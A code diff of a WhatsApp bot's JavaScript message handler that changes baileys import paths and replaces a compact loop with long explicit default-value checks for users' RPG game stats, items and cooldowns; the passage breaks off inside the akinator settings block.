@@ -1,28 +1,27 @@
-import { generateWAMessageFromContent } from "baileys";
-import { smsg } from './src/libraries/simple.js';
-import { format } from 'util';
-import { fileURLToPath } from 'url';
-import path, { join } from 'path';
-import { unwatchFile, watchFile } from 'fs';
+import {generateWAMessageFromContent} from '@whiskeysockets/baileys';
+import {smsg} from './lib/simple.js';
+import {format} from 'util';
+import {fileURLToPath} from 'url';
+import path, {join} from 'path';
+import {unwatchFile, watchFile} from 'fs';
 import fs from 'fs';
 import chalk from 'chalk';
 import mddd5 from 'md5';
 import ws from 'ws';
-let mconn;
 
 /**
- * @type {import("baileys")}
+ * @type {import('@whiskeysockets/baileys')}
  */
-const { proto } = (await import("baileys")).default;
+const {proto} = (await import('@whiskeysockets/baileys')).default;
 const isNumber = (x) => typeof x === 'number' && !isNaN(x);
-const delay = (ms) => isNumber(ms) && new Promise((resolve) => setTimeout(function () {
+const delay = (ms) => isNumber(ms) && new Promise((resolve) => setTimeout(function() {
   clearTimeout(this);
   resolve();
 }, ms));
 
 /**
  * Handle messages upsert
- * @param {import("baileys").BaileysEventMap<unknown>['messages.upsert']} groupsUpdate
+ * @param {import('@whiskeysockets/baileys').BaileysEventMap<unknown>['messages.upsert']} groupsUpdate
  */
 export async function handler(chatUpdate) {
   this.msgqueque = this.msgqueque || [];
@@ -46,8 +45,7 @@ export async function handler(chatUpdate) {
     if (!m) {
       return;
     }
-    global.mconn = m
-    mconn = m
+    global.mconn = m 
     m.exp = 0;
     m.money = false;
     m.limit = false;
@@ -66,12 +64,440 @@ export async function handler(chatUpdate) {
         global.db.data.users[m.sender] = {};
       }
       if (user) {
-        // im gona cook this
-        // why the fuck nobody put the code like this in 3 years??????
-        // credit to mystic or skidy89
-        const dick = {
-          afk: -1,
-          wait: 0,
+        if (!isNumber(user.exp)) user.exp = 0;
+        if (!('premium' in user)) user.premium = false;
+        if (!isNumber(user.joincount)) user.joincount = 2;
+        if (!isNumber(user.limit)) user.limit = 20;
+        if (!isNumber(user.money)) user.money = 15;
+        if (!('registered' in user)) user.registered = false;
+        if (!user.registered) {
+          if (!('name' in user)) user.name = m.name;
+          if (!isNumber(user.age)) user.age = -1;
+          if (!isNumber(user.anggur)) user.anggur = 0;
+          if (!isNumber(user.apel)) user.apel = 0;
+          if (!isNumber(user.bibitanggur)) user.bibitanggur = 0;
+          if (!isNumber(user.bibitapel)) user.bibitapel = 0;
+          if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0;
+          if (!isNumber(user.bibitmangga)) user.bibitmangga = 0;
+          if (!isNumber(user.bibitpisang)) user.bibitpisang = 0;
+          if (!isNumber(user.emas)) user.emas = 0;
+          if (!isNumber(user.jeruk)) user.jeruk = 0;
+          if (!isNumber(user.kayu)) user.kayu = 0;
+          if (!isNumber(user.makanan)) user.makanan = 0;
+          if (!isNumber(user.mangga)) user.mangga = 0;
+          if (!isNumber(user.pisang)) user.pisang = 0;
+          if (!isNumber(user.premiumDate)) user.premiumDate = -1;
+          if (!isNumber(user.regTime)) user.regTime = -1;
+          if (!isNumber(user.semangka)) user.semangka = 0;
+          if (!isNumber(user.stroberi)) user.stroberi = 0;
+        }
+        if (!isNumber(user.afk)) user.afk = -1;
+	        if (!('autolevelup' in user)) user.autolevelup = true;
+	        if (!('role' in user)) user.role = 'Novato';
+        if (!isNumber(user.agility)) user.agility = 0;
+        if (!isNumber(user.anakanjing)) user.anakanjing = 0;
+        if (!isNumber(user.anakcentaur)) user.anakcentaur = 0;
+        if (!isNumber(user.anakgriffin)) user.anakgriffin = 0;
+        if (!isNumber(user.anakkucing)) user.anakkucing = 0;
+        if (!isNumber(user.anakkuda)) user.anakkuda = 0;
+        if (!isNumber(user.anakkyubi)) user.anakkyubi = 0;
+        if (!isNumber(user.anaknaga)) user.anaknaga = 0;
+        if (!isNumber(user.anakpancingan)) user.anakpancingan = 0;
+        if (!isNumber(user.anakphonix)) user.anakphonix = 0;
+        if (!isNumber(user.anakrubah)) user.anakrubah = 0;
+        if (!isNumber(user.anakserigala)) user.anakserigala = 0;
+        if (!isNumber(user.anggur)) user.anggur = 0;
+        if (!isNumber(user.anjing)) user.anjing = 0;
+        if (!isNumber(user.anjinglastclaim)) user.anjinglastclaim = 0;
+        if (!isNumber(user.antispam)) user.antispam = 0;
+        if (!isNumber(user.antispamlastclaim)) user.antispamlastclaim = 0;
+        if (!isNumber(user.apel)) user.apel = 0;
+        if (!isNumber(user.aqua)) user.aqua = 0;
+        if (!isNumber(user.arc)) user.arc = 0;
+        if (!isNumber(user.arcdurability)) user.arcdurability = 0;
+        if (!isNumber(user.arlok)) user.arlok = 0;
+        if (!isNumber(user.armor)) user.armor = 0;
+        if (!isNumber(user.armordurability)) user.armordurability = 0;
+        if (!isNumber(user.armormonster)) user.armormonster = 0;
+        if (!isNumber(user.as)) user.as = 0;
+        if (!isNumber(user.atm)) user.atm = 0;
+        if (!isNumber(user.axe)) user.axe = 0;
+        if (!isNumber(user.axedurability)) user.axedurability = 0;
+        if (!isNumber(user.ayam)) user.ayam = 0;
+        if (!isNumber(user.ayamb)) user.ayamb = 0;
+        if (!isNumber(user.ayambakar)) user.ayambakar = 0;
+        if (!isNumber(user.ayamg)) user.ayamg = 0;
+        if (!isNumber(user.ayamgoreng)) user.ayamgoreng = 0;
+        if (!isNumber(user.babi)) user.babi = 0;
+        if (!isNumber(user.babihutan)) user.babihutan = 0;
+        if (!isNumber(user.babipanggang)) user.babipanggang = 0;
+        if (!isNumber(user.bandage)) user.bandage = 0;
+        if (!isNumber(user.bank)) user.bank = 0;
+        if (!isNumber(user.banteng)) user.banteng = 0;
+        if (!isNumber(user.batu)) user.batu = 0;
+        if (!isNumber(user.bawal)) user.bawal = 0;
+        if (!isNumber(user.bawalbakar)) user.bawalbakar = 0;
+        if (!isNumber(user.bayam)) user.bayam = 0;
+        if (!isNumber(user.berlian)) user.berlian = 10;
+        if (!isNumber(user.bibitanggur)) user.bibitanggur = 0;
+        if (!isNumber(user.bibitapel)) user.bibitapel = 0;
+        if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0;
+        if (!isNumber(user.bibitmangga)) user.bibitmangga = 0;
+        if (!isNumber(user.bibitpisang)) user.bibitpisang = 0;
+        if (!isNumber(user.botol)) user.botol = 0;
+        if (!isNumber(user.bow)) user.bow = 0;
+        if (!isNumber(user.bowdurability)) user.bowdurability = 0;
+        if (!isNumber(user.boxs)) user.boxs = 0;
+        if (!isNumber(user.brick)) user.brick = 0;
+        if (!isNumber(user.brokoli)) user.brokoli = 0;
+        if (!isNumber(user.buaya)) user.buaya = 0;
+        if (!isNumber(user.buntal)) user.buntal = 0;
+        if (!isNumber(user.cat)) user.cat = 0;
+        if (!isNumber(user.catexp)) user.catexp = 0;
+        if (!isNumber(user.catlastfeed)) user.catlastfeed = 0;
+        if (!isNumber(user.centaur)) user.centaur = 0;
+        if (!isNumber(user.centaurexp)) user.centaurexp = 0;
+        if (!isNumber(user.centaurlastclaim)) user.centaurlastclaim = 0;
+        if (!isNumber(user.centaurlastfeed)) user.centaurlastfeed = 0;
+        if (!isNumber(user.clay)) user.clay = 0;
+        if (!isNumber(user.coal)) user.coal = 0;
+        if (!isNumber(user.coin)) user.coin = 0;
+        if (!isNumber(user.common)) user.common = 0;
+        if (!isNumber(user.crystal)) user.crystal = 0;
+        if (!isNumber(user.cumi)) user.cumi = 0;
+        if (!isNumber(user.cupon)) user.cupon = 0;
+        if (!isNumber(user.diamond)) user.diamond = 3;
+        if (!isNumber(user.dog)) user.dog = 0;
+        if (!isNumber(user.dogexp)) user.dogexp = 0;
+        if (!isNumber(user.doglastfeed)) user.doglastfeed = 0;
+        if (!isNumber(user.dory)) user.dory = 0;
+        if (!isNumber(user.dragon)) user.dragon = 0;
+        if (!isNumber(user.dragonexp)) user.dragonexp = 0;
+        if (!isNumber(user.dragonlastfeed)) user.dragonlastfeed = 0;
+        if (!isNumber(user.emas)) user.emas = 0;
+        if (!isNumber(user.emerald)) user.emerald = 0;
+        if (!isNumber(user.enchant)) user.enchant = 0;
+        if (!isNumber(user.esteh)) user.esteh = 0;
+        if (!isNumber(user.exp)) user.exp = 0;
+        if (!isNumber(user.expg)) user.expg = 0;
+        if (!isNumber(user.exphero)) user.exphero = 0;
+	        if (!isNumber(user.eleksirb)) user.eleksirb = 0;
+	        if (!isNumber(user.emasbatang)) user.emasbatang = 0;
+	        if (!isNumber(user.emasbiasa)) user.emasbiasa = 0;
+	        if (!isNumber(user.fideos)) user.fideos = 0;
+        if (!isNumber(user.fishingrod)) user.fishingrod = 0;
+        if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0;
+        if (!isNumber(user.fortress)) user.fortress = 0;
+        if (!isNumber(user.fox)) user.fox = 0;
+        if (!isNumber(user.foxexp)) user.foxexp = 0;
+        if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0;
+        if (!isNumber(user.fullatm)) user.fullatm = 0;
+        if (!isNumber(user.gadodado)) user.gadodado = 0;
+        if (!isNumber(user.gajah)) user.gajah = 0;
+        if (!isNumber(user.gamemines)) user.gamemines = false;
+        if (!isNumber(user.ganja)) user.ganja = 0;
+        if (!isNumber(user.gardenboxs)) user.gardenboxs = 0;
+        if (!isNumber(user.gems)) user.gems = 0;
+        if (!isNumber(user.glass)) user.glass = 0;
+        if (!isNumber(user.glimit)) user.glimit = 20;
+        if (!isNumber(user.glory)) user.glory = 0;
+        if (!isNumber(user.gold)) user.gold = 0;
+        if (!isNumber(user.griffin)) user.griffin = 0;
+        if (!isNumber(user.griffinexp)) user.griffinexp = 0;
+        if (!isNumber(user.griffinlastclaim)) user.griffinlastclaim = 0;
+        if (!isNumber(user.griffinlastfeed)) user.griffinlastfeed = 0;
+        if (!isNumber(user.gulai)) user.gulai = 0;
+        if (!isNumber(user.gurita)) user.gurita = 0;
+        if (!isNumber(user.harimau)) user.harimau = 0;
+        if (!isNumber(user.haus)) user.haus = 100;
+        if (!isNumber(user.healt)) user.healt = 100;
+        if (!isNumber(user.health)) user.health = 100;
+        if (!isNumber(user.healthmonster)) user.healthmonster = 0;
+        if (!isNumber(user.healtmonster)) user.healtmonster = 0;
+        if (!isNumber(user.hero)) user.hero = 1;
+        if (!isNumber(user.herolastclaim)) user.herolastclaim = 0;
+        if (!isNumber(user.hiu)) user.hiu = 0;
+        if (!isNumber(user.horse)) user.horse = 0;
+        if (!isNumber(user.horseexp)) user.horseexp = 0;
+        if (!isNumber(user.horselastfeed)) user.horselastfeed = 0;
+        if (!isNumber(user.ikan)) user.ikan = 0;
+        if (!isNumber(user.ikanbakar)) user.ikanbakar = 0;
+        if (!isNumber(user.intelligence)) user.intelligence = 0;
+        if (!isNumber(user.iron)) user.iron = 0;
+        if (!isNumber(user.jagung)) user.jagung = 0;
+        if (!isNumber(user.jagungbakar)) user.jagungbakar = 0;
+        if (!isNumber(user.jeruk)) user.jeruk = 0;
+        if (!isNumber(user.joinlimit)) user.joinlimit = 1;
+        if (!isNumber(user.judilast)) user.judilast = 0;
+        if (!isNumber(user.kaleng)) user.kaleng = 0;
+        if (!isNumber(user.kambing)) user.kambing = 0;
+        if (!isNumber(user.kangkung)) user.kangkung = 0;
+        if (!isNumber(user.kapak)) user.kapak = 0;
+        if (!isNumber(user.kardus)) user.kardus = 0;
+        if (!isNumber(user.katana)) user.katana = 0;
+        if (!isNumber(user.katanadurability)) user.katanadurability = 0;
+        if (!isNumber(user.kayu)) user.kayu = 0;
+        if (!isNumber(user.kentang)) user.kentang = 0;
+        if (!isNumber(user.kentanggoreng)) user.kentanggoreng = 0;
+        if (!isNumber(user.kepiting)) user.kepiting = 0;
+        if (!isNumber(user.kepitingbakar)) user.kepitingbakar = 0;
+        if (!isNumber(user.kerbau)) user.kerbau = 0;
+        if (!isNumber(user.kerjadelapan)) user.kerjadelapan = 0;
+        if (!isNumber(user.kerjadelapanbelas)) user.kerjadelapanbelas = 0;
+        if (!isNumber(user.kerjadua)) user.kerjadua = 0;
+        if (!isNumber(user.kerjaduabelas)) user.kerjaduabelas = 0;
+        if (!isNumber(user.kerjaduadelapan)) user.kerjaduadelapan = 0;
+        if (!isNumber(user.kerjaduadua)) user.kerjaduadua = 0;
+        if (!isNumber(user.kerjaduaempat)) user.kerjaduaempat = 0;
+        if (!isNumber(user.kerjaduaenam)) user.kerjaduaenam = 0;
+        if (!isNumber(user.kerjadualima)) user.kerjadualima = 0;
+        if (!isNumber(user.kerjaduapuluh)) user.kerjaduapuluh = 0;
+        if (!isNumber(user.kerjaduasatu)) user.kerjaduasatu = 0;
+        if (!isNumber(user.kerjaduasembilan)) user.kerjaduasembilan = 0;
+        if (!isNumber(user.kerjaduatiga)) user.kerjaduatiga = 0;
+        if (!isNumber(user.kerjaduatujuh)) user.kerjaduatujuh = 0;
+        if (!isNumber(user.kerjaempat)) user.kerjaempat = 0;
+        if (!isNumber(user.kerjaempatbelas)) user.kerjaempatbelas = 0;
+        if (!isNumber(user.kerjaenam)) user.kerjaenam = 0;
+        if (!isNumber(user.kerjaenambelas)) user.kerjaenambelas = 0;
+        if (!isNumber(user.kerjalima)) user.kerjalima = 0;
+        if (!isNumber(user.kerjalimabelas)) user.kerjalimabelas = 0;
+        if (!isNumber(user.kerjasatu)) user.kerjasatu = 0;
+        if (!isNumber(user.kerjasebelas)) user.kerjasebelas = 0;
+        if (!isNumber(user.kerjasembilan)) user.kerjasembilan = 0;
+        if (!isNumber(user.kerjasembilanbelas)) user.kerjasembilanbelas = 0;
+        if (!isNumber(user.kerjasepuluh)) user.kerjasepuluh = 0;
+        if (!isNumber(user.kerjatiga)) user.kerjatiga = 0;
+        if (!isNumber(user.kerjatigabelas)) user.kerjatigabelas = 0;
+        if (!isNumber(user.kerjatigapuluh)) user.kerjatigapuluh = 0;
+        if (!isNumber(user.kerjatujuh)) user.kerjatujuh = 0;
+        if (!isNumber(user.kerjatujuhbelas)) user.kerjatujuhbelas = 0;
+        if (!isNumber(user.korbanngocok)) user.korbanngocok = 0;
+        if (!isNumber(user.kubis)) user.kubis = 0;
+        if (!isNumber(user.kucing)) user.kucing = 0;
+        if (!isNumber(user.kucinglastclaim)) user.kucinglastclaim = 0;
+        if (!isNumber(user.kuda)) user.kuda = 0;
+        if (!isNumber(user.kudalastclaim)) user.kudalastclaim = 0;
+        if (!isNumber(user.kyubi)) user.kyubi = 0;
+        if (!isNumber(user.kyubiexp)) user.kyubiexp = 0;
+        if (!isNumber(user.kyubilastclaim)) user.kyubilastclaim = 0;
+        if (!isNumber(user.kyubilastfeed)) user.kyubilastfeed = 0;
+        if (!isNumber(user.labu)) user.labu = 0;
+        if (!isNumber(user.laper)) user.laper = 100;
+        if (!isNumber(user.lastadventure)) user.lastadventure = 0;
+        if (!isNumber(user.lastbansos)) user.lastbansos = 0;
+        if (!isNumber(user.lastberbru)) user.lastberbru = 0;
+        if (!isNumber(user.lastberkebon)) user.lastberkebon = 0;
+        if (!isNumber(user.lastbunga)) user.lastbunga = 0;
+        if (!isNumber(user.lastbunuhi)) user.lastbunuhi = 0;
+	        if (!isNumber(user.lastcoins)) user.lastcoins = 0;
+        if (!isNumber(user.lastclaim)) user.lastclaim = 0;
+        if (!isNumber(user.lastcode)) user.lastcode = 0;
+	        if (!isNumber(user.lastcofre)) user.lastcofre = 0;
+        if (!isNumber(user.lastcodereg)) user.lastcodereg = 0;
+        if (!isNumber(user.lastcrusade)) user.lastcrusade = 0;
+        if (!isNumber(user.lastdagang)) user.lastdagang = 0;
+	        if (!isNumber(user.lastdiamantes)) user.lastdiamantes = 0;
+        if (!isNumber(user.lastduel)) user.lastduel = 0;
+        if (!isNumber(user.lastdungeon)) user.lastdungeon = 0;
+        if (!isNumber(user.lasteasy)) user.lasteasy = 0;
+        if (!isNumber(user.lastfight)) user.lastfight = 0;
+        if (!isNumber(user.lastfishing)) user.lastfishing = 0;
+        if (!isNumber(user.lastgift)) user.lastgift = 0;
+        if (!isNumber(user.lastgojek)) user.lastgojek = 0;
+        if (!isNumber(user.lastgrab)) user.lastgrab = 0;
+        if (!isNumber(user.lasthourly)) user.lasthourly = 0;
+        if (!isNumber(user.lasthunt)) user.lasthunt = 0;
+        if (!isNumber(user.lastIstigfar)) user.lastIstigfar = 0;
+        if (!isNumber(user.lastjb)) user.lastjb = 0;
+        if (!isNumber(user.lastkill)) user.lastkill = 0;
+        if (!isNumber(user.lastlink)) user.lastlink = 0;
+        if (!isNumber(user.lastlumber)) user.lastlumber = 0;
+        if (!isNumber(user.lastmancingeasy)) user.lastmancingeasy = 0;
+        if (!isNumber(user.lastmancingextreme)) user.lastmancingextreme = 0;
+        if (!isNumber(user.lastmancinghard)) user.lastmancinghard = 0;
+        if (!isNumber(user.lastmancingnormal)) user.lastmancingnormal = 0;
+        if (!isNumber(user.lastmining)) user.lastmining = 0;
+        if (!isNumber(user.lastmisi)) user.lastmisi = 0;
+        if (!isNumber(user.lastmonthly)) user.lastmonthly = 0;
+        if (!isNumber(user.lastmulung)) user.lastmulung = 0;
+        if (!isNumber(user.lastnambang)) user.lastnambang = 0;
+        if (!isNumber(user.lastnebang)) user.lastnebang = 0;
+        if (!isNumber(user.lastngocok)) user.lastngocok = 0;
+        if (!isNumber(user.lastngojek)) user.lastngojek = 0;
+        if (!isNumber(user.lastopen)) user.lastopen = 0;
+        if (!isNumber(user.lastpekerjaan)) user.lastpekerjaan = 0;
+	        if (!isNumber(user.lastpago)) user.lastpago = 0;
+        if (!isNumber(user.lastpotionclaim)) user.lastpotionclaim = 0;
+        if (!isNumber(user.lastrampok)) user.lastrampok = 0;
+        if (!isNumber(user.lastramuanclaim)) user.lastramuanclaim = 0;
+        if (!isNumber(user.lastrob)) user.lastrob = 0;
+        if (!isNumber(user.lastroket)) user.lastroket = 0;
+        if (!isNumber(user.lastsda)) user.lastsda = 0;
+        if (!isNumber(user.lastseen)) user.lastseen = 0;
+        if (!isNumber(user.lastSetStatus)) user.lastSetStatus = 0;
+	        if (!isNumber(user.lastspam)) user.lastspam = 0;
+        if (!isNumber(user.lastsironclaim)) user.lastsironclaim = 0;
+        if (!isNumber(user.lastsmancingclaim)) user.lastsmancingclaim = 0;
+        if (!isNumber(user.laststringclaim)) user.laststringclaim = 0;
+        if (!isNumber(user.lastswordclaim)) user.lastswordclaim = 0;
+        if (!isNumber(user.lastturu)) user.lastturu = 0;
+        if (!isNumber(user.lastwar)) user.lastwar = 0;
+        if (!isNumber(user.lastwarpet)) user.lastwarpet = 0;
+        if (!isNumber(user.lastweaponclaim)) user.lastweaponclaim = 0;
+        if (!isNumber(user.lastweekly)) user.lastweekly = 0;
+        if (!isNumber(user.lastwork)) user.lastwork = 0;
+        if (!isNumber(user.legendary)) user.legendary = 0;
+        if (!isNumber(user.lele)) user.lele = 0;
+        if (!isNumber(user.leleb)) user.leleb = 0;
+        if (!isNumber(user.lelebakar)) user.lelebakar = 0;
+        if (!isNumber(user.leleg)) user.leleg = 0;
+        if (!isNumber(user.level)) user.level = 0;
+        if (!isNumber(user.limit)) user.limit = 20;
+        if (!isNumber(user.limitjoinfree)) user.limitjoinfree = 1;
+        if (!isNumber(user.lion)) user.lion = 0;
+        if (!isNumber(user.lionexp)) user.lionexp = 0;
+        if (!isNumber(user.lionlastfeed)) user.lionlastfeed = 0;
+        if (!isNumber(user.lobster)) user.lobster = 0;
+        if (!isNumber(user.lumba)) user.lumba = 0;
+        if (!isNumber(user.magicwand)) user.magicwand = 0;
+        if (!isNumber(user.magicwanddurability)) user.magicwanddurability = 0;
+        if (!isNumber(user.makanancentaur)) user.makanancentaur = 0;
+        if (!isNumber(user.makanangriffin)) user.makanangriffin = 0;
+        if (!isNumber(user.makanankyubi)) user.makanankyubi = 0;
+        if (!isNumber(user.makanannaga)) user.makanannaga = 0;
+        if (!isNumber(user.makananpet)) user.makananpet = 0;
+        if (!isNumber(user.makananphonix)) user.makananphonix = 0;
+        if (!isNumber(user.makananserigala)) user.makananserigala = 0;
+        if (!isNumber(user.mana)) user.mana = 0;
+        if (!isNumber(user.mangga)) user.mangga = 0;
+        if (!isNumber(user.money)) user.money = 15;
+        if (!isNumber(user.monyet)) user.monyet = 0;
+        if (!isNumber(user.mythic)) user.mythic = 0;
+        if (!isNumber(user.naga)) user.naga = 0;
+        if (!isNumber(user.nagalastclaim)) user.nagalastclaim = 0;
+        if (!isNumber(user.net)) user.net = 0;
+        if (!isNumber(user.nila)) user.nila = 0;
+        if (!isNumber(user.nilabakar)) user.nilabakar = 0;
+        if (!isNumber(user.note)) user.note = 0;
+        if (!isNumber(user.ojekk)) user.ojekk = 0;
+        if (!isNumber(user.oporayam)) user.oporayam = 0;
+        if (!isNumber(user.orca)) user.orca = 0;
+        if (!isNumber(user.pancing)) user.pancing = 0;
+        if (!isNumber(user.pancingan)) user.pancingan = 1;
+        if (!isNumber(user.panda)) user.panda = 0;
+        if (!isNumber(user.paus)) user.paus = 0;
+        if (!isNumber(user.pausbakar)) user.pausbakar = 0;
+        if (!isNumber(user.pc)) user.pc = 0;
+        if (!isNumber(user.pepesikan)) user.pepesikan = 0;
+        if (!isNumber(user.pertambangan)) user.pertambangan = 0;
+        if (!isNumber(user.pertanian)) user.pertanian = 0;
+        if (!isNumber(user.pet)) user.pet = 0;
+        if (!isNumber(user.petFood)) user.petFood = 0;
+        if (!isNumber(user.phonix)) user.phonix = 0;
+        if (!isNumber(user.phonixexp)) user.phonixexp = 0;
+        if (!isNumber(user.phonixlastclaim)) user.phonixlastclaim = 0;
+        if (!isNumber(user.phonixlastfeed)) user.phonixlastfeed = 0;
+        if (!isNumber(user.pickaxe)) user.pickaxe = 0;
+        if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0;
+        if (!isNumber(user.pillhero)) user.pillhero= 0;
+        if (!isNumber(user.pisang)) user.pisang = 0;
+        if (!isNumber(user.pointxp)) user.pointxp = 0;
+        if (!isNumber(user.potion)) user.potion = 0;
+        if (!isNumber(user.psenjata)) user.psenjata = 0;
+        if (!isNumber(user.psepick)) user.psepick = 0;
+        if (!isNumber(user.ramuan)) user.ramuan = 0;
+        if (!isNumber(user.ramuancentaurlast)) user.ramuancentaurlast = 0;
+        if (!isNumber(user.ramuangriffinlast)) user.ramuangriffinlast = 0;
+        if (!isNumber(user.ramuanherolast)) user.ramuanherolast = 0;
+        if (!isNumber(user.ramuankucinglast)) user.ramuankucinglast = 0;
+        if (!isNumber(user.ramuankudalast)) user.ramuankudalast = 0;
+        if (!isNumber(user.ramuankyubilast)) user.ramuankyubilast = 0;
+        if (!isNumber(user.ramuannagalast)) user.ramuannagalast = 0;
+        if (!isNumber(user.ramuanphonixlast)) user.ramuanphonixlast = 0;
+        if (!isNumber(user.ramuanrubahlast)) user.ramuanrubahlast = 0;
+        if (!isNumber(user.ramuanserigalalast)) user.ramuanserigalalast = 0;
+        if (!isNumber(user.reglast)) user.reglast = 0;
+        if (!isNumber(user.rendang)) user.rendang = 0;
+        if (!isNumber(user.rhinoceros)) user.rhinoceros = 0;
+        if (!isNumber(user.rhinocerosexp)) user.rhinocerosexp = 0;
+        if (!isNumber(user.rhinoceroslastfeed)) user.rhinoceroslastfeed = 0;
+        if (!isNumber(user.robo)) user.robo = 0;
+        if (!isNumber(user.roboxp)) user.roboxp = 0;
+        if (!isNumber(user.rock)) user.rock = 0;
+        if (!isNumber(user.roket)) user.roket = 0;
+        if (!isNumber(user.roti)) user.roti = 0;
+        if (!isNumber(user.rubah)) user.rubah = 0;
+        if (!isNumber(user.rubahlastclaim)) user.rubahlastclaim = 0;
+        if (!isNumber(user.rumahsakit)) user.rumahsakit = 0;
+        if (!isNumber(user.sampah)) user.sampah = 0;
+        if (!isNumber(user.sand)) user.sand = 0;
+        if (!isNumber(user.sapi)) user.sapi = 0;
+        if (!isNumber(user.sapir)) user.sapir = 0;
+        if (!isNumber(user.seedbayam)) user.seedbayam = 0;
+        if (!isNumber(user.seedbrokoli)) user.seedbrokoli = 0;
+        if (!isNumber(user.seedjagung)) user.seedjagung = 0;
+        if (!isNumber(user.seedkangkung)) user.seedkangkung = 0;
+        if (!isNumber(user.seedkentang)) user.seedkentang = 0;
+        if (!isNumber(user.seedkubis)) user.seedkubis = 0;
+        if (!isNumber(user.seedlabu)) user.seedlabu = 0;
+        if (!isNumber(user.seedtomat)) user.seedtomat = 0;
+        if (!isNumber(user.seedwortel)) user.seedwortel = 0;
+        if (!isNumber(user.serigala)) user.serigala = 0;
+        if (!isNumber(user.serigalalastclaim)) user.serigalalastclaim = 0;
+        if (!isNumber(user.shield)) user.shield = false;
+        if (!isNumber(user.skillexp)) user.skillexp = 0;
+        if (!isNumber(user.snlast)) user.snlast = 0;
+        if (!isNumber(user.soda)) user.soda = 0;
+        if (!isNumber(user.sop)) user.sop = 0;
+        if (!isNumber(user.spammer)) user.spammer = 0;
+        if (!isNumber(user.spinlast)) user.spinlast = 0;
+        if (!isNumber(user.ssapi)) user.ssapi = 0;
+        if (!isNumber(user.stamina)) user.stamina = 100;
+        if (!isNumber(user.steak)) user.steak = 0;
+        if (!isNumber(user.stick)) user.stick = 0;
+        if (!isNumber(user.strength)) user.strength = 0;
+        if (!isNumber(user.string)) user.string = 0;
+        if (!isNumber(user.superior)) user.superior = 0;
+        if (!isNumber(user.suplabu)) user.suplabu = 0;
+        if (!isNumber(user.sushi)) user.sushi = 0;
+        if (!isNumber(user.sword)) user.sword = 0;
+        if (!isNumber(user.sworddurability)) user.sworddurability = 0;
+        if (!isNumber(user.tigame)) user.tigame = 50;
+        if (!isNumber(user.tiketcoin)) user.tiketcoin = 0;
+        if (!isNumber(user.title)) user.title = 0;
+        if (!isNumber(user.tomat)) user.tomat = 0;
+        if (!isNumber(user.tprem)) user.tprem = 0;
+        if (!isNumber(user.trash)) user.trash = 0;
+        if (!isNumber(user.trofi)) user.trofi = 0;
+        if (!isNumber(user.troopcamp)) user.troopcamp = 0;
+        if (!isNumber(user.tumiskangkung)) user.tumiskangkung = 0;
+        if (!isNumber(user.udang)) user.udang = 0;
+        if (!isNumber(user.udangbakar)) user.udangbakar = 0;
+        if (!isNumber(user.umpan)) user.umpan = 0;
+        if (!isNumber(user.uncoommon)) user.uncoommon = 0;
+        if (!isNumber(user.unreglast)) user.unreglast = 0;
+        if (!isNumber(user.upgrader)) user.upgrader = 0;
+        if (!isNumber(user.vodka)) user.vodka = 0;
+        if (!isNumber(user.wallet)) user.wallet = 0;
+        if (!isNumber(user.warn)) user.warn = 0;
+        if (!isNumber(user.weapon)) user.weapon = 0;
+        if (!isNumber(user.weapondurability)) user.weapondurability = 0;
+        if (!isNumber(user.wolf)) user.wolf = 0;
+        if (!isNumber(user.wolfexp)) user.wolfexp = 0;
+        if (!isNumber(user.wolflastfeed)) user.wolflastfeed = 0;
+        if (!isNumber(user.wood)) user.wood = 0;
+        if (!isNumber(user.wortel)) user.wortel = 0;
+        if (!user.lbars) user.lbars = '[▒▒▒▒▒▒▒▒▒]';
+        if (!user.job) user.job = 'Desempleo';
+        if (!user.premium) user.premium = false;
+        if (!user.premium) user.premiumTime = 0;
+        if (!user.wait) user.wait = 0;
+        if (!user.rtrofi) user.rtrofi = 'Bronce';
+      } else {
+        global.db.data.users[m.sender] = {
+		    afk: -1,
+		    wait: 0,
           afkReason: '',
           age: -1,
           agility: 16,
@@ -165,10 +591,10 @@ export async function handler(chatUpdate) {
           expg: 0,
           exphero: 0,
           expired: 0,
-          eleksirb: 0,
-          emasbatang: 0,
-          emasbiasa: 0,
-          fideos: 0,
+		    eleksirb: 0,
+		    emasbatang: 0,
+		    emasbiasa: 0,
+		    fideos: 0,
           fishingrod: 0,
           fishingroddurability: 0,
           fortress: 0,
@@ -179,7 +605,6 @@ export async function handler(chatUpdate) {
           gadodado: 0,
           gajah: 0,
           gamemines: false,
-          mute: false,
           ganja: 0,
           gardenboxs: 0,
           gems: 0,
@@ -210,7 +635,7 @@ export async function handler(chatUpdate) {
           jagungbakar: 0,
           jeruk: 0,
           job: 'Pengangguran',
-          joincount: 2,
+		            joincount: 2,
           joinlimit: 1,
           judilast: 0,
           kaleng: 0,
@@ -272,14 +697,14 @@ export async function handler(chatUpdate) {
           lastberkebon: 0,
           lastbunga: 0,
           lastbunuhi: 0,
-          lastcoins: 0,
+		    lastcoins: 0,
           lastclaim: 0,
           lastcode: 0,
-          lastcofre: 0,
+		    lastcofre: 0,
           lastcrusade: 0,
           lastdaang: 0,
           lastdagang: 0,
-          lastdiamantes: 0,
+		    lastdiamantes: 0,
           lastduel: 0,
           lastdungeon: 0,
           lasteasy: 0,
@@ -307,10 +732,10 @@ export async function handler(chatUpdate) {
           lastngojek: 0,
           lastopen: 0,
           lastpekerjaan: 0,
-          lastpago: 0,
+		    lastpago: 0,
           lastpotionclaim: 0,
           lastramuanclaim: 0,
-          lastspam: 0,
+	            lastspam: 0,
           lastrob: 0,
           lastroket: 0,
           lastseen: 0,
@@ -472,20 +897,24 @@ export async function handler(chatUpdate) {
           wolflastfeed: 0,
           wood: 0,
           wortel: 0,
-          language: 'es',
-          gameglx: {},
-        }
-      for (const dicks in dick) {
-        if (user[dicks] === undefined || !user.hasOwnProperty(dicks)) {
-          user[dicks] = dick[dicks] // god pls forgive me
-        }
-      }}
+        };
+      }
       const akinator = global.db.data.users[m.sender].akinator;
-      if (typeof akinator !== 'object') {
+		    if (typeof akinator !== 'object') {
         global.db.data.users[m.sender].akinator = {};
       }
-      if (akinator) {
-        const akiSettings = {
+		    if (akinator) {
+        if (!('sesi' in akinator)) akinator.sesi = false;
+        if (!('server' in akinator)) akinator.server = null;
+        if (!('frontaddr' in akinator)) akinator.frontaddr = null;
+        if (!('session' in akinator)) akinator.session = null;
+        if (!('signature' in akinator)) akinator.signature = null;
